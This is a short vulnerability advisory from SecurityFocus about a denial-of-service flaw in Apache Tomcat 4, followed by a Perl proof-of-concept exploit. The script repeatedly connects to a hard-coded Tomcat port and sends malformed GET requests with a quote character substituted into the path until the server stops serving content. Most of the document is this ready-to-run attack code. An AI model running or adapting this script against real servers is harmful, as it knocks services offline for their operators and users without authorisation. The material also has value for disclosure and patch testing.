source: http://www.securityfocus.com/bid/8824/info

Apache Tomcat 4 has been reported prone to a remotely triggered denial-of-service vulnerability when handling undisclosed non-HTTP request types.

When certain non-HTTP request types are handled by the Tomcat HTTP connector, the Tomcat server will reject subsequent requests on the affected port until the service is restarted. 

#!/usr/bin/perl
#
# PoC - DoS Exploit for Apache Tomcat 4
# by Oliver Karow - oliver.karowNOSPAM__AT__gmx.de
# http://www.oliverkarow.de/research/tomcat_crash.txt
#
# Run this script against the Tomcat Admin Port. After execution, the page will not be accessible any more.
# The port is still open and accepting connections, but not responding with content. To verify, connect with your browser
# to the port.
#

use IO::Socket;

$ip="192.168.0.16";
$port="8080";
$counter =0;


@attackpattern=("'");
for ($x=0;$x<=400;$x++){
  $headerLine="GET /dummy/dontexist.pl? HTTP/1.0\n\n";
  @temp=split(/(\/)/,$headerLine);
  foreach (@temp){
     $replaceme=$_;
       foreach(@attackpattern){
    $attack=$_;
    $newheaderline=$headerLine;
      $newheaderline=~ s/$replaceme/$attack/i;
      $remote=IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>$ip, PeerPort=>$port, Timeout=>5) or die "Connection not possible\n";
    print $remote $newheaderline;
    print "\nRequest: ".$counter++." \t".$newheaderline."\n";
       $remote->close;
  }
  }
}
